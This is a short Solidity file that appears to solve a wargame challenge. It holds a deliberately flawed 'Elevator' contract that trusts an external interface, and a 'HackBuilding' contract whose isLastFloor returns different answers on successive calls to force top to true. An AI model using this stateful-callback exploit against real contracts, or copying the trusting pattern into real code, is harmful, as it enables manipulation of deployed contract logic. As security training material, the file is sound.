pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract HackBuilding {
    address public elevator;
    bool private _state;

    constructor(address elevatorAddress) {
        elevator = elevatorAddress;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (_state) {
            return true;
        } else {
            _state = true;
            return false;
        }
    }

    function attack() public {
        Elevator(elevator).goTo(100);
    }
}